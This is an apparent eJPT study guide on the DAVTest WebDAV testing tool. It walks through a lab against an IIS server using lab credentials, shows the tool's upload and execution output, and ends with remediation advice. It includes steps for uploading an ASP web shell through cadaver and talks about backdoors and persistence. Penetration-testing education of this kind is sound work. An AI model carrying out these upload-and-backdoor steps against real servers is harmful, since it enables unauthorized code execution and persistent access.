# üîß DAVTest - WebDAV Testing and Exploitation Tool

WebDAV scanner and testing utility for discovering WebDAV configuration and upload capabilities

**Location in Framework:** `web-pentesting/file-upload/davtest.md`

---

## üéØ What is DAVTest?

DAVTest is a specialized tool for testing WebDAV (Web Distributed Authoring and Versioning) servers to identify misconfigurations and potential file upload vulnerabilities. It automatically tests various file types and HTTP methods to determine what can be uploaded and executed on the target WebDAV server.

**Key Capabilities:**
- **WebDAV Discovery:** Identifies WebDAV-enabled directories
- **File Type Testing:** Tests upload capabilities for various file extensions  
- **Method Enumeration:** Tests supported HTTP methods (PUT, MOVE, COPY, etc.)
- **Execution Testing:** Attempts to execute uploaded files
- **Authentication Support:** Handles basic HTTP authentication

WebDAV servers are commonly found on Windows IIS servers and can provide an attack vector for file upload and remote code execution if misconfigured.

---

## üì¶ Installation and Setup

### Prerequisites
- Kali Linux (pre-installed)
- Network connectivity to target
- Valid credentials (if authentication required)

### Verification
```bash
# Verify davtest installation
which davtest
davtest --help
```

**Expected Output:**
```
/usr/bin/davtest
davtest version 1.0
 -auth    username:password (colon separated)
 -realm   realm name (optional)
 -url     url of DAV location
```

---

## üîß Basic Usage and Syntax

### Essential DAVTest Workflow
```bash
# 1. Basic WebDAV discovery
davtest -url http://target/webdav

# 2. Authenticated testing
davtest -auth username:password -url http://target/webdav

# 3. Comprehensive testing with execution attempts
davtest -auth user:pass -url http://target/webdav -exec
```

### Core Command Structure
- **Discovery Mode:** `davtest -url` - Basic WebDAV capability testing
- **Authenticated Mode:** `davtest -auth` - Testing with credentials
- **Execution Mode:** `davtest -exec` - Attempts to execute uploaded files

---

## ‚öôÔ∏è Command Line Options

### Primary Options
| Option | Description | Example |
|--------|-------------|---------|
| `-url` | Target WebDAV URL | `-url http://demo.ine.local/webdav` |
| `-auth` | Authentication credentials | `-auth bob:password_123321` |
| `-realm` | Authentication realm | `-realm "WebDAV Server"` |
| `-exec` | Attempt file execution | `-exec` |

### Advanced Options
| Option | Description | Usage |
|--------|-------------|-------|
| `-sendbd` | Send backdoor files | Used for payload delivery |
| `-move` | Test MOVE method | File manipulation testing |
| `-copy` | Test COPY method | File duplication testing |
| `-cleanup` | Remove test files | Clean up after testing |

---

## üß™ Real Lab Examples

### Lab: Windows IIS Server DAVTest

**Scenario:** Testing WebDAV server on Windows IIS for file upload vulnerabilities
- **Target URL:** http://demo.ine.local/webdav
- **Target Service:** Microsoft IIS httpd 10.0
- **Authentication:** Basic Authentication (bob:password_123321)
- **Objective:** Test file upload capabilities and achieve code execution

#### Phase 1: Initial WebDAV Discovery

**Step 1: Basic WebDAV Testing**
```bash
davtest -url http://demo.ine.local/webdav
```

**Expected Lab Output:**
```
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized, Basic realm="demo.ine.local"
```

**Analysis:** WebDAV directory exists but requires authentication. The 401 Unauthorized with Basic realm indicates HTTP Basic Authentication is required.

#### Phase 2: Authenticated WebDAV Testing

**Step 2: Authenticated Testing with Credentials**
```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

**Expected Lab Output:**
```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
********************************************************
 NOTE    Random string for this session: AqOeSdckMtf
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.txt
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.pl
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.html
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.jsp
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.php
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.cgi
PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.jhtml
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.shtml
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.cfm
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.asp
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.aspx
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.html
EXEC    html    FAIL
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL
EXEC    cfm     FAIL
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.asp
EXEC    aspx    FAIL
```

#### Phase 3: Results Analysis

**Key Findings from Lab:**
- **Upload Success:** All tested file types can be uploaded successfully
- **ASP Execution:** ASP files can be executed on the server (SUCCEED)
- **HTML Execution:** HTML files are served and executed
- **Directory Creation:** MKCOL method allows directory creation
- **Authentication:** Basic authentication with bob:password_123321 works

**Critical Security Finding:**
The WebDAV server allows ASP file upload and execution, which enables remote code execution on the Windows IIS server.

#### Phase 4: Exploitation Preparation

**Complete Results Summary:**
```
/usr/bin/davtest Summary:
Created: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.txt
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.pl
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.html
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.jsp
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.php
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.cgi
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.jhtml
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.shtml
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.cfm
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.asp
PUT File: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.aspx
Executes: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.txt
Executes: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.html
Executes: http://demo.ine.local/webdav/DavTestDir_AqOeSdckMtf/davtest_AqOeSdckMtf.asp
```

---

## üéØ eJPT Exam Focus

### Essential DAVTest Skills for eJPT Certification

#### 1. WebDAV Discovery and Testing
```bash
# Complete workflow for eJPT exam
nmap --script http-enum -sV -p 80 target
davtest -url http://target/webdav
davtest -auth username:password -url http://target/webdav
```

#### 2. File Upload Vulnerability Assessment
- **Upload Testing:** Identify which file types can be uploaded
- **Execution Testing:** Determine which uploaded files can be executed
- **Authentication Bypass:** Test for authentication weaknesses
- **Directory Traversal:** Test for path manipulation vulnerabilities

#### 3. Exploitation Preparation
- **Backdoor Identification:** Determine suitable backdoor file types
- **Payload Selection:** Choose appropriate payloads for the target platform
- **Access Method Planning:** Plan how to access uploaded backdoors
- **Persistence Planning:** Consider long-term access methods

### Common eJPT Exam Scenarios
- **WebDAV Discovery:** Finding WebDAV endpoints through enumeration
- **Authentication Testing:** Testing weak or default credentials
- **File Upload Exploitation:** Uploading web shells for remote access
- **Post-Exploitation:** Using uploaded backdoors for system access

### Critical eJPT Commands to Memorize
```bash
# Discovery and authentication testing
davtest -url http://target/webdav
davtest -auth user:pass -url http://target/webdav

# Integration with nmap
nmap --script http-enum -p 80 target
nmap --script http-webdav-scan -p 80 target
```

### eJPT Exam Tips
- **Time Management:** DAVTest provides quick assessment of upload capabilities
- **Common Mistakes:** Not testing with proper authentication credentials
- **Best Practices:** Always test both upload and execution capabilities
- **Integration Points:** Combine with cadaver for manual file upload and management

---

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: Authentication Required (401 Unauthorized)
```bash
# Problem symptoms
OPEN            FAIL:   http://target/webdav    Unauthorized, Basic realm="target"

# Solution with credentials
davtest -auth username:password -url http://target/webdav
```

### Issue 2: WebDAV Directory Not Found (404)
```bash
# Problem: Wrong WebDAV path
# Use nmap to discover correct path
nmap --script http-enum -p 80 target
nmap --script http-webdav-scan -p 80 target

# Try common WebDAV paths
davtest -url http://target/webdav
davtest -url http://target/dav
davtest -url http://target/_vti_bin
```

### Issue 3: Upload Succeeds but Execution Fails
```bash
# All uploads succeed but no execution
# Check server configuration and file permissions
# Try different file extensions for the same platform
# Use cadaver for manual verification
```

### Issue 4: SSL/TLS Connection Issues
```bash
# For HTTPS WebDAV servers
davtest -auth user:pass -url https://target/webdav

# If certificate issues occur, use curl for testing
curl -u user:pass -X OPTIONS https://target/webdav/ -k
```

---

## üîó Integration with Other Tools

### Pre-DAVTest Preparation
```bash
# Use nmap for initial discovery
nmap --script http-enum -sV -p 80,443 target
nmap --script http-webdav-scan -p 80,443 target

# Then proceed with davtest
davtest -url http://target/webdav
```

### Integration with Cadaver
**Workflow Integration:**
1. **DAVTest for assessment:** Identifies upload and execution capabilities
2. **Cadaver for exploitation:** Manual file upload and management
3. **Combined Approach:** Automated testing followed by manual exploitation

```bash
# Assessment phase
davtest -auth user:pass -url http://target/webdav

# Manual exploitation phase
cadaver http://target/webdav
# (then use put command to upload backdoor)
```

### Integration with Nmap HTTP Scripts
```bash
# Comprehensive WebDAV discovery
nmap --script http-webdav-scan --script-args http-webdav-scan.root=/webdav/ target
nmap --script http-methods --script-args http-methods.url-path=/webdav/ target

# Follow up with davtest
davtest -auth credentials -url http://target/webdav
```

### Integration with Web Shells
**Post-DAVTest Exploitation:**
```bash
# Based on davtest findings, upload appropriate backdoor
# If ASP execution is possible on IIS:
cadaver http://target/webdav
put /usr/share/webshells/asp/webshell.asp
```

---

## üìù Documentation and Reporting

### Evidence Collection

#### 1. Command Documentation
```bash
# Create evidence log for WebDAV testing
echo "WebDAV Testing with DAVTest:" > webdav_evidence.txt
echo "==============================" >> webdav_evidence.txt
echo "Date: $(date)" >> webdav_evidence.txt
echo "Target: http://demo.ine.local/webdav" >> webdav_evidence.txt
echo "" >> webdav_evidence.txt

# Log davtest execution
echo "$(date): davtest -auth bob:password_123321 -url http://demo.ine.local/webdav" >> webdav_evidence.txt
```

### Key Information to Document

#### Technical Details
- **Target Information:**
  - WebDAV URL: http://demo.ine.local/webdav
  - Authentication method: Basic Authentication
  - Credentials used: bob:password_123321
  - Server software: Microsoft IIS httpd 10.0

#### Critical Findings
- **Upload Capabilities:**
  - All tested file types can be uploaded
  - Directory creation allowed (MKCOL method)
  - No file type restrictions identified

- **Execution Results:**
  - ASP files execute successfully (Critical vulnerability)
  - HTML files are served and processed
  - Other file types upload but don't execute

#### Security Impact Assessment
```
1. Critical Vulnerability: ASP Code Execution
   - Impact: Remote code execution on Windows server
   - Risk Level: High
   - Exploitability: Easily exploitable with valid credentials

2. Information Disclosure
   - WebDAV directory allows file browsing
   - Directory creation capabilities
   - No apparent access controls beyond authentication

3. Potential for Persistent Access
   - Uploaded files remain accessible
   - Multiple file types accepted
   - No apparent cleanup mechanisms
```

### Report Recommendations
- **Immediate Actions:** Disable WebDAV or implement strict file type filtering
- **Access Controls:** Implement proper authorization beyond basic authentication
- **File Validation:** Add server-side file type and content validation
- **Monitoring:** Implement logging and monitoring for WebDAV activities
